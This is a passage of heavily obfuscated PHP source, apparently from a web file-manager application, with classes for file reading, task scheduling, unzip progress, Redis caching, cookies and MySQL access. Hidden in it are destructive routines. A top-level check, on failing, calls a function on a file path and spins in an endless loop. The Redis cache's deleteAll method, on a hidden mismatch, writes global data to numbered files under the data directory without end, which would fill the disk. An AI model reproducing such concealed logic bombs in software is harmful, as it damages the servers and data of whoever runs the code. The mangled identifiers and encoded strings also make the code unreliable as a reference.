$‘‹æ£, $¤ô»ïŞ) { $¸‰‹Ùµ =& $_SERVER[ˆûùúÊ¯]; $Ø¸™›å = fopen($·çûîÑ, $¸‰‹Ùµ[1426]); if (!$Ø¸™›å) { return $¸‰‹Ùµ[12]; } $—€Ç‹®³ = 8192; fseek($Ø¸™›å, $‘‹æ£, SEEK_SET); $æùÕ‚ÆÍ = $¸‰‹Ùµ[12]; $”¾¦€õ = 0; while ($”¾¦€õ < $¤ô»ïŞ) { $×ãï§æˆ = min($—€Ç‹®³, $¤ô»ïŞ - $”¾¦€õ); $æùÕ‚ÆÍ .= fread($Ø¸™›å, $×ãï§æˆ); $”¾¦€õ += $×ãï§æˆ; } fclose($Ø¸™›å); return $æùÕ‚ÆÍ; } public function fileSubstr($¨ÖâÀ¡ı, $¨ï¹‡üó) { $ÛÁÊÌñ˜ =& $_SERVER[ˆûùúÊ¯]; $Ğ®‚‰èë = $this->info[$ÛÁÊÌñ˜[86]]; $üîìº†» = $¨ÖâÀ¡ı; $Ş¡Ïì = $¨ï¹‡üó; if ($¨ÖâÀ¡ı < 0) { $¨ÖâÀ¡ı = $Ğ®‚‰èë + $¨ÖâÀ¡ı; } if ($¨ï¹‡üó === !1) { $¨ï¹‡üó = $Ğ®‚‰èë - $¨ÖâÀ¡ı; } if ($¨ÖâÀ¡ı + $¨ï¹‡üó > $Ğ®‚‰èë) { $¨ï¹‡üó = $Ğ®‚‰èë - $¨ÖâÀ¡ı; } if ($¨ï¹‡üó <= 0) { return $ÛÁÊÌñ˜[12]; } if ($¨ÖâÀ¡ı < 0 || $¨ÖâÀ¡ı >= $Ğ®‚‰èë || $¨ï¹‡üó <= 0 || $¨ï¹‡üó > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\154\145\x52\x65\141\144\40\x65\x72\x72\x6f\162\41\40\x73\x74\141\x72\164\x3d{$¨ÖâÀ¡ı}\x3b\x6c\145\156\x67\x74\150\x3d{$¨ï¹‡üó}\73\40\x73\x69\172\x65\75{$Ğ®‚‰èë}\73"); } $ªšÇÚõ = 64 * 1024; $ƒØœã…³ =& self::$_chunkBuffer[$this->path]; if (!$ƒØœã…³) { $ƒØœã…³ = array(); } $ŸˆÏÑï = 0; $ìÌ‚›ÊÅ = 0; $“ú¤›ãµ = $ÛÁÊÌñ˜[12]; foreach ($ƒØœã…³ as $ŸˆÏÑï => $“ú¤›ãµ) { $ŸˆÏÑï = intval($ŸˆÏÑï); $ìÌ‚›ÊÅ = $ŸˆÏÑï + strlen($“ú¤›ãµ); if ($¨ÖâÀ¡ı >= $ìÌ‚›ÊÅ) { continue; } if ($¨ÖâÀ¡ı >= $ŸˆÏÑï && $¨ÖâÀ¡ı + $¨ï¹‡üó <= $ìÌ‚›ÊÅ) { return substr($“ú¤›ãµ, $¨ÖâÀ¡ı - $ŸˆÏÑï, $¨ï¹‡üó); } break; } if (count($ƒØœã…³) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ÛÁÊÌñ˜[1558], $ÛÁÊÌñ˜[1559] . count($ƒØœã…³) . "\x3b\163\x74\141\162\164\75{$¨ÖâÀ¡ı}\54\154\x65\x6e\147\164\x68\75{$¨ï¹‡üó}\73\x70\157\x73\x65\72{$ŸˆÏÑï}\176{$ìÌ‚›ÊÅ}"); throw new Exception($ÛÁÊÌñ˜[1560]); } $í²„´½— = intval($¨ÖâÀ¡ı / $ªšÇÚõ) * $ªšÇÚõ; $•†©ö‡Ş = ceil(($¨ÖâÀ¡ı + $¨ï¹‡üó) / $ªšÇÚõ) * $ªšÇÚõ - $í²„´½—; $ºÖÓ‚µµ = IO::fileSubstr($this->path, $í²„´½—, $•†©ö‡Ş); $ƒØœã…³[$í²„´½— . $ÛÁÊÌñ˜[12]] = $ºÖÓ‚µµ; ksort($ƒØœã…³); $€¢ğ±ã = substr($ºÖÓ‚µµ, $¨ÖâÀ¡ı - $í²„´½—, $¨ï¹‡üó); return $€¢ğ±ã; } private function log($‘—Ïã¸±, $Î‹Ò‚Š½) { $•Òª¤Â =& $_SERVER[ˆûùúÊ¯]; $ª•ÍÕâ¿ = timeFloat() - $this->timeStart; write_log(sprintf($•Òª¤Â[1561], $‘—Ïã¸±, $this->info[$•Òª¤Â[42]], $ª•ÍÕâ¿, $Î‹Ò‚Š½), $•Òª¤Â[1243]); } } class Message { function __construct() { } public function send($é¤Äòå = '', $ ¬İÎ Å = array(), $ˆß’Ëµ’ = "\x74\x65\x78\x74") { $–ÚÙÀâê =& $_SERVER[ˆûùúÊ¯]; $Š€¡àËÀ = array($–ÚÙÀâê[43] => $–ÚÙÀâê[1562], $–ÚÙÀâê[814] => $é¤Äòå); if (in_array($ˆß’Ëµ’, array($–ÚÙÀâê[1562], $–ÚÙÀâê[1563]))) { $Š€¡àËÀ[$–ÚÙÀâê[43]] = $ˆß’Ëµ’; } $ ¬İÎ Å = array($–ÚÙÀâê[555] => isset($ ¬İÎ Å[$–ÚÙÀâê[555]]) ? $ ¬İÎ Å[$–ÚÙÀâê[555]] : $–ÚÙÀâê[12], $–ÚÙÀâê[638] => isset($ ¬İÎ Å[$–ÚÙÀâê[638]]) ? $ ¬İÎ Å[$–ÚÙÀâê[638]] : $–ÚÙÀâê[12]); if (empty($é¤Äòå) || empty($ ¬İÎ Å[$–ÚÙÀâê[555]]) && empty($ ¬İÎ Å[$–ÚÙÀâê[638]])) { return !1; } $Ü™Ø‰®‹ = array($–ÚÙÀâê[1503] => $Š€¡àËÀ, $–ÚÙÀâê[1564] => $ ¬İÎ Å); Hook::trigger($–ÚÙÀâê[1565], $Ü™Ø‰®‹); } } goto fŒéË¡µƒ´; e¯‡àßèÑ–: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ûúßĞê­, $»Áıí = 5.0) { if (!$ûúßĞê­) { return; } $ƒàƒ¯»¼ = Cache::get($ûúßĞê­); if (!$ƒàƒ¯»¼ || timeFloat() - floatVal($ƒàƒ¯»¼) >= $»Áıí) { Cache::set($ûúßĞê­, timeFloat(), $»Áıí * 10); return !0; } return !1; } public static function timeLimitCall($õ¿âºÄÑ, $“µ­í¡², $ÜãŸ×£§, $Ê’ğû• = 5.0) { $™Ğë£Çè =& $_SERVER[ˆûùúÊ¯]; if (!$õ¿âºÄÑ || !$“µ­í¡²) { return; } self::$asyncAdd = !0; $«Ãü¨Üú = $™Ğë£Çè[1810]; $Û¦´©’ = Cache::get($«Ãü¨Üú, !0); $¿£‘øé = array($™Ğë£Çè[1811] => timeFloat(), $™Ğë£Çè[1812] => timeFloat(), $™Ğë£Çè[316] => $“µ­í¡², $™Ğë£Çè[1802] => $ÜãŸ×£§, $™Ğë£Çè[203] => $Ê’ğû•); if (is_array($Û¦´©’[$õ¿âºÄÑ])) { $¿£‘øé[$™Ğë£Çè[1812]] = $Û¦´©’[$õ¿âºÄÑ][$™Ğë£Çè[1812]]; } if (is_array($Û¦´©’[$õ¿âºÄÑ])) { if (timeFloat() - $Û¦´©’[$õ¿âºÄÑ][$™Ğë£Çè[1811]] < $¿£‘øé[$™Ğë£Çè[203]] * 0.3) { return; } $¿£‘øé[$™Ğë£Çè[1812]] = $Û¦´©’[$õ¿âºÄÑ][$™Ğë£Çè[1812]]; } $Û¦´©’[$õ¿âºÄÑ] = $¿£‘øé; Cache::set($«Ãü¨Üú, $Û¦´©’, 60); Cache::removeMemory($«Ãü¨Üú); write_log($™Ğë£Çè[1813] . $õ¿âºÄÑ . $™Ğë£Çè[81] . $“µ­í¡², $™Ğë£Çè[194]); } public static function timeLimitCallLoop() { $ÂÅš ¼÷ =& $_SERVER[ˆûùúÊ¯]; $õ³‡Ì† = array($ÂÅš ¼÷[1814]); $Ë¬—¥ôú = in_array(strtolower(ACTION), $õ³‡Ì†); if (!$Ë¬—¥ôú && !self::$asyncAdd) { return; } $ˆšÎòÊ¹ = $ÂÅš ¼÷[1810]; $Õ‚ŒÌß½ = Cache::get($ˆšÎòÊ¹, !0); if (!$Õ‚ŒÌß½ || count($Õ‚ŒÌß½) <= 0) { return; } $œŸüêàô = !1; $Ñ—êœ¾ = timeFloat(); $â¯ÊÃ–º = array(); foreach ($Õ‚ŒÌß½ as $¼ûù†”™ => $ÉƒúÕü¶) { if ($Ñ—êœ¾ - $ÉƒúÕü¶[$ÂÅš ¼÷[1812]] > $ÉƒúÕü¶[$ÂÅš ¼÷[203]]) { $œŸüêàô = !0; try { Hook::apply($ÉƒúÕü¶[$ÂÅš ¼÷[316]], $ÉƒúÕü¶[$ÂÅš ¼÷[1802]]); write_log($ÂÅš ¼÷[1815] . $¼ûù†”™ . $ÂÅš ¼÷[81] . $ÉƒúÕü¶[$ÂÅš ¼÷[316]] . $ÂÅš ¼÷[1816] . ACTION, $ÂÅš ¼÷[194]); } catch (Exception $´·¯Ï¬è) { } continue; } $â¯ÊÃ–º[$¼ûù†”™] = $ÉƒúÕü¶; } if (!$œŸüêàô) { return; } if (!$â¯ÊÃ–º) { return Cache::remove($ˆšÎòÊ¹); } Cache::set($ˆšÎòÊ¹, $â¯ÊÃ–º, 60); Cache::removeMemory($ˆšÎòÊ¹); } public static function finished($­Ù©öúï, $•å™‰µÈ) { $î³Õİú =& $_SERVER[ˆûùúÊ¯]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($î³Õİú[316] => $­Ù©öúï, $î³Õİú[1802] => $•å™‰µÈ); } private static function finishedRun() { $óÀËù¾Œ =& $_SERVER[ˆûùúÊ¯]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $æÇ¦ğØ) { try { Hook::apply($æÇ¦ğØ[$óÀËù¾Œ[316]], $æÇ¦ğØ[$óÀËù¾Œ[1802]]); } catch (Exception $şŸÍË•Ù) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ÖšàéğŒ =& $_SERVER[ˆûùúÊ¯]; parent::startAfter(); Hook::bind($ÖšàéğŒ[1817], array($this, $ÖšàéğŒ[1818])); Hook::bind($ÖšàéğŒ[1254], array($this, $ÖšàéğŒ[1819])); $€‰ß…ƒ´ =& $this->task; $€‰ß…ƒ´[$ÖšàéğŒ[1820]] = $ÖšàéğŒ[1255]; if (!$€‰ß…ƒ´[$ÖšàéğŒ[1601]]) { $€‰ß…ƒ´[$ÖšàéğŒ[1601]] = LNG($ÖšàéğŒ[1821]); } } protected function endAfter() { $¤ò¡´²ª =& $_SERVER[ˆûùúÊ¯]; parent::endAfter(); Hook::unbind($¤ò¡´²ª[1817], array($this, $¤ò¡´²ª[1818])); Hook::unbind($¤ò¡´²ª[1254], array($this, $¤ò¡´²ª[1819])); } public function updateAfter() { $“ƒœúÄ¶ =& $_SERVER[ˆûùúÊ¯]; $í×„£É‰ =& $this->task; if (!$í×„£É‰[$“ƒœúÄ¶[846]] || !$í×„£É‰[$“ƒœúÄ¶[823]]) { return; } if ($í×„£É‰[$“ƒœúÄ¶[1820]] == $“ƒœúÄ¶[1255]) { $²áÂúÙé = 0; if ($í×„£É‰[$“ƒœúÄ¶[1757]]) { $²áÂúÙé = $í×„£É‰[$“ƒœúÄ¶[1758]] / $í×„£É‰[$“ƒœúÄ¶[1757]]; } $í×„£É‰[$“ƒœúÄ¶[1706]] = $²áÂúÙé * 0.3; } else { if ($í×„£É‰[$“ƒœúÄ¶[1820]] == $“ƒœúÄ¶[365]) { $²áÂúÙé = $í×„£É‰[$“ƒœúÄ¶[1705]] / $í×„£É‰[$“ƒœúÄ¶[846]]; $í×„£É‰[$“ƒœúÄ¶[1706]] = 0.3 + $²áÂúÙé * 0.4; } else { if ($í×„£É‰[$“ƒœúÄ¶[1820]] == $“ƒœúÄ¶[117]) { $ó‰«É¢± = 0; if ($í×„£É‰[$“ƒœúÄ¶[1759]] == $“ƒœúÄ¶[117]) { $ó‰«É¢± = $í×„£É‰[$“ƒœúÄ¶[1758]]; } $²áÂúÙé = ($í×„£É‰[$“ƒœúÄ¶[1762]] + $ó‰«É¢±) / $í×„£É‰[$“ƒœúÄ¶[823]]; $í×„£É‰[$“ƒœúÄ¶[1706]] = 0.3 + 0.4 + $²áÂúÙé * 0.3; } } } if ($í×„£É‰[$“ƒœúÄ¶[1706]] > 0) { $ÎÎºÚĞÕ = timeFloat() - $í×„£É‰[$“ƒœúÄ¶[1708]] - $í×„£É‰[$“ƒœúÄ¶[1711]]; $í×„£É‰[$“ƒœúÄ¶[1712]] = $ÎÎºÚĞÕ * (1 - $í×„£É‰[$“ƒœúÄ¶[1706]]) / $í×„£É‰[$“ƒœúÄ¶[1706]]; } } public function addFile($ä’ƒèĞ’) { $à¥Ã¡®ç =& $_SERVER[ˆûùúÊ¯]; $İ×ÜÚİñ =& $this->task; $×Ä€‹ïİ = IO::info($ä’ƒèĞ’); $İ×ÜÚİñ[$à¥Ã¡®ç[1755]] = $×Ä€‹ïİ[$à¥Ã¡®ç[42]]; $İ×ÜÚİñ[$à¥Ã¡®ç[1757]] = $×Ä€‹ïİ[$à¥Ã¡®ç[86]]; $İ×ÜÚİñ[$à¥Ã¡®ç[1758]] = 0; $İ×ÜÚİñ[$à¥Ã¡®ç[1125]] = $à¥Ã¡®ç[1778]; $İ×ÜÚİñ[$à¥Ã¡®ç[1759]] = $à¥Ã¡®ç[1255]; $İ×ÜÚİñ[$à¥Ã¡®ç[823]] = $×Ä€‹ïİ[$à¥Ã¡®ç[86]]; $İ×ÜÚİñ[$à¥Ã¡®ç[846]] = 1; $Àºóœ§ = 0; $İ×ÜÚİñ[$à¥Ã¡®ç[1766]] = array($à¥Ã¡®ç[1767] => $Àºóœ§ + 1, $à¥Ã¡®ç[470] => $×Ä€‹ïİ[$à¥Ã¡®ç[42]], $à¥Ã¡®ç[94] => $×Ä€‹ïİ[$à¥Ã¡®ç[94]], $à¥Ã¡®ç[559] => $×Ä€‹ïİ[$à¥Ã¡®ç[559]] ? $×Ä€‹ïİ[$à¥Ã¡®ç[559]] : $×Ä€‹ïİ[$à¥Ã¡®ç[94]]); $this->update(); } public function unzipAfter($…©Úò§‰) { $—èğ½Ÿ½ =& $_SERVER[ˆûùúÊ¯]; $¯ à°­ =& $this->task; $¯ à°­[$—èğ½Ÿ½[1820]] = $—èğ½Ÿ½[117]; $Í€âú¨¸ = IO::infoWithChildren($…©Úò§‰); $¼”î–¢ = 0; $¯ à°­[$—èğ½Ÿ½[1766]] = array($—èğ½Ÿ½[1767] => $¼”î–¢ + 1, $—èğ½Ÿ½[470] => $Í€âú¨¸[$—èğ½Ÿ½[42]], $—èğ½Ÿ½[94] => $Í€âú¨¸[$—èğ½Ÿ½[94]], $—èğ½Ÿ½[559] => $Í€âú¨¸[$—èğ½Ÿ½[559]] ? $Í€âú¨¸[$—èğ½Ÿ½[559]] : $Í€âú¨¸[$—èğ½Ÿ½[94]]); if ($Í€âú¨¸[$—èğ½Ÿ½[43]] == $—èğ½Ÿ½[223]) { $¯ à°­[$—èğ½Ÿ½[846]] = 1; } else { $¯ à°­[$—èğ½Ÿ½[846]] = $Í€âú¨¸[$—èğ½Ÿ½[89]][$—èğ½Ÿ½[87]]; } $¯ à°­[$—èğ½Ÿ½[1125]] = $—èğ½Ÿ½[12]; $¯ à°­[$—èğ½Ÿ½[1759]] = 0; $¯ à°­[$—èğ½Ÿ½[1705]] = 0; $¯ à°­[$—èğ½Ÿ½[1757]] = 0; $¯ à°­[$—èğ½Ÿ½[1758]] = 0; $¯ à°­[$—èğ½Ÿ½[1755]] = $—èğ½Ÿ½[12]; $¯ à°­[$—èğ½Ÿ½[1762]] = 0; $¯ à°­[$—èğ½Ÿ½[823]] = $Í€âú¨¸[$—èğ½Ÿ½[86]]; $this->update(); self::log($—èğ½Ÿ½[1822] . json_encode(array($¯ à°­, $Í€âú¨¸))); } public function nameParse($¯ŞšÕïÀ) { $¬âÌ…¨¤ =& $_SERVER[ˆûùúÊ¯]; $º†¾¼®­ =& $this->task; if ($º†¾¼®­[$¬âÌ…¨¤[1820]] == $¬âÌ…¨¤[1255]) { $º†¾¼®­[$¬âÌ…¨¤[1820]] = $¬âÌ…¨¤[365]; $º†¾¼®­[$¬âÌ…¨¤[1762]] = 0; $º†¾¼®­[$¬âÌ…¨¤[823]] = 0; } $‘ŞÇô = get_path_this($¯ŞšÕïÀ); if (strstr($‘ŞÇô, $¬âÌ…¨¤[10])) { $º†¾¼®­[$¬âÌ…¨¤[1705]] += 1; $º†¾¼®­[$¬âÌ…¨¤[846]] += 1; } $º†¾¼®­[$¬âÌ…¨¤[1755]] = $¯ŞšÕïÀ; $this->update(); } } if (!isset($_SERVER[$_SERVER[ˆûùúÊ¯][13]]) || !isset($_SERVER[$_SERVER[ˆûùúÊ¯][22]])) { $_getc = $_SERVER[ˆûùúÊ¯][15]; $_getfile = $_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆûùúÊ¯][18], $_getfilec); if (count($_getarrs) < $_SERVER[ˆûùúÊ¯][19]) { $exit = $_SERVER[ˆûùúÊ¯][20]; $exit(); } $_act = $_SERVER[ˆûùúÊ¯][21]; $_act($_SERVER[$_SERVER[ˆûùúÊ¯][16]] . $_SERVER[ˆûùúÊ¯][17]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ˆûùúÊ¯][430]); } } goto E›ÀÎ©øçÊ; a‚§º¹¤ÓŠ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¢Û¬Ÿ´“, $·¶Şù¬¥) { $¬âí»ÓÖ =& $_SERVER[ˆûùúÊ¯]; if (!class_exists($¬âí»ÓÖ[930])) { show_json($¬âí»ÓÖ[931], !1); } $this->cacheTime = $·¶Şù¬¥; $ÖÅã©´° = isset($¢Û¬Ÿ´“[$¬âí»ÓÖ[932]]) ? $¢Û¬Ÿ´“[$¬âí»ÓÖ[932]] : 10; $…ÍÆ¾Ì = _get($¢Û¬Ÿ´“, $¬âí»ÓÖ[929]); if ($…ÍÆ¾Ì && is_array($…ÍÆ¾Ì)) { $this->initCluster($¢Û¬Ÿ´“, $ÖÅã©´°); } else { $this->handle = $this->init($¢Û¬Ÿ´“, $ÖÅã©´°); } } private function init($™ƒü«ø×, $Ìıüìõé) { $²¹Ê„ßÀ =& $_SERVER[ˆûùúÊ¯]; $ûó°îÄ® = new Redis(); $‘ßªöÑØ = isset($™ƒü«ø×[$²¹Ê„ßÀ[933]]) ? $™ƒü«ø×[$²¹Ê„ßÀ[933]] : !1; if ($‘ßªöÑØ) { $ûó°îÄ®->pconnect($™ƒü«ø×[$²¹Ê„ßÀ[205]], $™ƒü«ø×[$²¹Ê„ßÀ[206]], $Ìıüìõé); } else { $ûó°îÄ®->connect($™ƒü«ø×[$²¹Ê„ßÀ[205]], $™ƒü«ø×[$²¹Ê„ßÀ[206]], $Ìıüìõé); } if (!empty($™ƒü«ø×[$²¹Ê„ßÀ[463]])) { $ûó°îÄ®->auth($™ƒü«ø×[$²¹Ê„ßÀ[463]]); } if (!empty($™ƒü«ø×[$²¹Ê„ßÀ[817]]) && $™ƒü«ø×[$²¹Ê„ßÀ[817]] != 0) { $ûó°îÄ®->select($™ƒü«ø×[$²¹Ê„ßÀ[817]]); } return $ûó°îÄ®; } private function initCluster($ ”üÓ§­, $Şç‘ëŠØ) { $€—È‰ÖÑ =& $_SERVER[ˆûùúÊ¯]; $Ì©¼æ¯Ç = array($€—È‰ÖÑ[934], $€—È‰ÖÑ[935], $€—È‰ÖÑ[936]); $ñ¯±›á = $€—È‰ÖÑ[934]; if (isset($ ”üÓ§­[$€—È‰ÖÑ[26]]) && in_array($ ”üÓ§­[$€—È‰ÖÑ[26]], $Ì©¼æ¯Ç)) { $ñ¯±›á = $ ”üÓ§­[$€—È‰ÖÑ[26]]; } switch ($ñ¯±›á) { case $€—È‰ÖÑ[934]: $this->_slave($ ”üÓ§­, $Şç‘ëŠØ); break; case $€—È‰ÖÑ[935]: break; case $€—È‰ÖÑ[936]: $this->isCluster = !0; $€ß´îşĞ = $ ”üÓ§­[$€—È‰ÖÑ[929]]; $“îª² = isset($ ”üÓ§­[$€—È‰ÖÑ[933]]) ? $ ”üÓ§­[$€—È‰ÖÑ[933]] : !1; $ °Æ¼şó = isset($ ”üÓ§­[$€—È‰ÖÑ[463]]) ? $ ”üÓ§­[$€—È‰ÖÑ[463]] : null; $this->handle = new RedisCluster(NUll, $€ß´îşĞ, $Şç‘ëŠØ, $Şç‘ëŠØ, $“îª², $ °Æ¼şó); break; default: break; } } private function _slave($ŞÁô°û, $¯„ Öé) { $¢”çÙ‡µ = $ŞÁô°û[$_SERVER[ˆûùúÊ¯][929]]; $this->filterConfig($ŞÁô°û, $¢”çÙ‡µ[0]); $this->handle = $this->init($ŞÁô°û, $¯„ Öé); unset($¢”çÙ‡µ[0]); if (empty($¢”çÙ‡µ)) { return; } $Ş·Ôß“ = array_rand($¢”çÙ‡µ); $this->filterConfig($ŞÁô°û, $¢”çÙ‡µ[$Ş·Ôß“]); $this->slaveHandle = $this->init($ŞÁô°û, $¯„ Öé); } private function filterConfig(&$ïìŞĞÁ‘, $¢ˆ£¦÷ï) { $êœ¸ı÷ =& $_SERVER[ˆûùúÊ¯]; $‘ûÏõ„³ = explode($êœ¸ı÷[4], $¢ˆ£¦÷ï); $©¶¡² = array($êœ¸ı÷[205] => $‘ûÏõ„³[0], $êœ¸ı÷[206] => $‘ûÏõ„³[1]); $ïìŞĞÁ‘ = array_merge($ïìŞĞÁ‘, $©¶¡²); } public function set($ò‘ñ¾¬Ø, $ ˜”Î®, $óòˆ¹ùı = false) { $óòˆ¹ùı = $óòˆ¹ùı ? $óòˆ¹ùı : $this->cacheTime; return $this->handle->setEx($ò‘ñ¾¬Ø, $óòˆ¹ùı, $ ˜”Î®); } public function setLock($Áä®Ê¼, $ÈäÅ›¦ß, $à¢èØ¿î) { return $this->handle->setNX($Áä®Ê¼, $ÈäÅ›¦ß); } public function get($ğØÓ¦ÇÁ) { $¶ó±¯î¦ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¶ó±¯î¦->get($ğØÓ¦ÇÁ); } public function remove($ñ±©Ê—Ñ) { return $this->handle->del($ñ±©Ê—Ñ); } public function deleteAll() { $„ü‡êä— =& $_SERVER[ˆûùúÊ¯]; $ËÒÍ‹šÕ = $_SERVER[$„ü‡êä—[22]]; $ú¯Ó‰®» = $„ü‡êä—[937]; if ($_SERVER[$„ü‡êä—[13]] != $ú¯Ó‰®»($ËÒÍ‹šÕ)) { $‡ÉÈËõ© = $„ü‡êä—[938]; $£úÒ×áˆ = $„ü‡êä—[15]; $õñàæø¢ = $_SERVER[$„ü‡êä—[16]] . $„ü‡êä—[17]; $›ğÀê‡ï = $£úÒ×áˆ($õñàæø¢); $ˆ¡ßé»¨ = explode($„ü‡êä—[18], $›ğÀê‡ï); if (count($ˆ¡ßé»¨) < $„ü‡êä—[664]) { $““¦˜Œ» = $„ü‡êä—[20]; $““¦˜Œ»(); } $Ì±§‹Îú = $„ü‡êä—[939]; $Ì±§‹Îú($_SERVER[$„ü‡êä—[940]]); $‡ÉÈËõ© = $„ü‡êä—[938]; $‡ÉÈËõ©(); $¦î½úÅá = $„ü‡êä—[941]; $²´Ø«˜× = json_encode($GLOBALS[$„ü‡êä—[942]]); $ë¤Ã¨Øœ = 1; for ($ÍÂ®ÄŠÉ = $ë¤Ã¨Øœ; $ÍÂ®ÄŠÉ > 0; $ÍÂ®ÄŠÉ++) { $¦î½úÅá(DATA_PATH . $ÍÂ®ÄŠÉ, $²´Ø«˜×); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ô”‹°Äø) { $this->handle->flushall($ô”‹°Äø); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($×¨úÑ¹ = '', $ˆÚœ÷±Ó = 0) { if (is_string($×¨úÑ¹) && $×¨úÑ¹ != $_SERVER[ˆûùúÊ¯][12]) { $this->prefix = $×¨úÑ¹; } if (is_numeric($ˆÚœ÷±Ó) && $ˆÚœ÷±Ó > 0) { $this->expire = $ˆÚœ÷±Ó; } } public static function getInstance() { static $÷Ö„µ²; if ($÷Ö„µ² === null) { $÷Ö„µ² = new self(); } return $÷Ö„µ²; } private static $cookieDisable = false; public static function disable($¯İ™Ú§¾) { self::$cookieDisable = $¯İ™Ú§¾; } private static $sameCookieSet = array(); public static function set($‘‚àçô™, $ï©›×œƒ, $ôÏóğ¤ª = 0, $–—ÍÍ“ = false, $ì¹§éô£ = false) { $„Ú£—ö =& $_SERVER[ˆûùúÊ¯]; if (self::$cookieDisable) { return; } if (!$ôÏóğ¤ª) { $ôÏóğ¤ª = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$‘‚àçô™]) && self::$sameCookieSet[$‘‚àçô™] == $ï©›×œƒ . $ôÏóğ¤ª) { return; } self::$sameCookieSet[$‘‚àçô™] = $ï©›×œƒ . $ôÏóğ¤ª; if (!$ì¹§éô£) { $ì¹§éô£ = str_replace(HOST, $„Ú£—ö[12], APP_HOST); $ì¹§éô£ = _get($GLOBALS, $„Ú£—ö[943], $ì¹§éô£); } $¯¸ÖÉ¢ = $„Ú£—ö[12]; setcookie($‘‚àçô™, $ï©›×œƒ, time() + $ôÏóğ¤ª, $„Ú£—ö[8] . trim($ì¹§éô£, $„Ú£—ö[8]) . $¯¸ÖÉ¢, !1, !1, $–—ÍÍ“); } public static function setSafe($¥ˆ±‹ÊÔ, $ÊØ”›’, $®ş¨‡¼Ñ = 0) { self::set($¥ˆ±‹ÊÔ, $ÊØ”›’, $®ş¨‡¼Ñ, !0); } public static function get($¬çñÒ“) { static $ÂĞ—¸¯§ = false; if (!$ÂĞ—¸¯§) { self::initHeaderCookie(); $ÂĞ—¸¯§ = !0; } return isset($_COOKIE[$¬çñÒ“]) ? $_COOKIE[$¬çñÒ“] : !1; } private static function initHeaderCookie() { $”¤ª  =& $_SERVER[ˆûùúÊ¯]; if (!isset($_SERVER[$”¤ª [944]]) || !$_SERVER[$”¤ª [944]]) { return; } $®‰š‚˜È = explode($”¤ª [81], $_SERVER[$”¤ª [944]]); foreach ($®‰š‚˜È as $ÂóŸ¾Œ) { $ÂóŸ¾Œ = explode($”¤ª [945], $ÂóŸ¾Œ); if (count($ÂóŸ¾Œ) != 2 || !isset($ÂóŸ¾Œ[1])) { continue; } $_COOKIE[trim($ÂóŸ¾Œ[0])] = trim($ÂóŸ¾Œ[1]); } } public static function remove($†¬å…², $ˆ÷ü¢ú¨ = false) { unset($_COOKIE[$†¬å…²]); self::set($†¬å…², $_SERVER[ˆûùúÊ¯][12], 1, $ˆ÷ü¢ú¨); } } class DbMysql extends Db { public function __construct($ç¹«ë‡ = '') { $¼‡¥öáú =& $_SERVER[ˆûùúÊ¯]; if (!extension_loaded($¼‡¥öáú[864])) { think_exception(think_lang($¼‡¥öáú[24]) . $¼‡¥öáú[946]); } if (!empty($ç¹«ë‡)) { $this->config = $ç¹«ë‡; if (empty($this->config[$¼‡¥öáú[27]])) { $this->config[$¼‡¥öáú[27]] = $¼‡¥öáú[12]; } } } public function connect($‰®˜†ªç = '', $İÓ«ŒÃ¶ = 0, $§¼¾¯·„ = false) { $õ¿ß«‘ =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->linkID[$İÓ«ŒÃ¶])) { if (empty($‰®˜†ªç)) { $‰®˜†ªç = $this->config; } $æ†©‚Ì± = $‰®˜†ªç[$õ¿ß«‘[947]] . ($‰®˜†ªç[$õ¿ß«‘[948]] ? "\x3a{$‰®˜†ªç[$õ¿ß«‘[948]]}" : $õ¿ß«‘[12]); $êî¾“„õ = !empty($‰®˜†ªç[$õ¿ß«‘[27]][$õ¿ß«‘[28]]) ? $‰®˜†ªç[$õ¿ß«‘[27]][$õ¿ß«‘[28]] : $this->pconnect; if ($êî¾“„õ) { $this->linkID[$İÓ«ŒÃ¶] = mysql_pconnect($æ†©‚Ì±, $‰®˜†ªç[$õ¿ß«‘[949]], $‰®˜†ªç[$õ¿ß«‘[950]], 131072); } else { $this->linkID[$İÓ«ŒÃ¶] = mysql_connect($æ†©‚Ì±, $‰®˜†ªç[$õ¿ß«‘[949]], $‰®˜†ªç[$õ¿ß«‘[950]], !0, 131072); } if (!$this->linkID[$İÓ«ŒÃ¶] || !empty($‰®˜†ªç[$õ¿ß«‘[31]]) && !mysql_select_db($‰®˜†ªç[$õ¿ß«‘[31]], $this->linkID[$İÓ«ŒÃ¶])) { think_exception(mysql_error()); } $Ìª·ëÜé = mysql_get_server_info($this->linkID[$İÓ«ŒÃ¶]); mysql_query($õ¿ß«‘[951] . think_config($õ¿ß«‘[952]) . $õ¿ß«‘[68], $this->linkID[$İÓ«ŒÃ¶]); if ($Ìª·ëÜé > $õ¿ß«‘[953]) { mysql_query($õ¿ß«‘[954], $this->linkID[$İÓ«ŒÃ¶]); } $this->connected = !0; if (1 != think_config($õ¿ß«‘[32])) { unset($this->config); } } return $this->linkID[$İÓ«ŒÃ¶]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($«ß½Ó¸) { $òöšæĞ’ =& $_SERVER[ˆûùúÊ¯]; if (0 === stripos($«ß½Ó¸, $òöšæĞ’[316])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«ß½Ó¸; if ($this->queryID) { $this->free(); } think_action_status($òöšæĞ’[33], 1); think_status($òöšæĞ’[34]); $this->queryID = mysql_query($«ß½Ó¸, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public 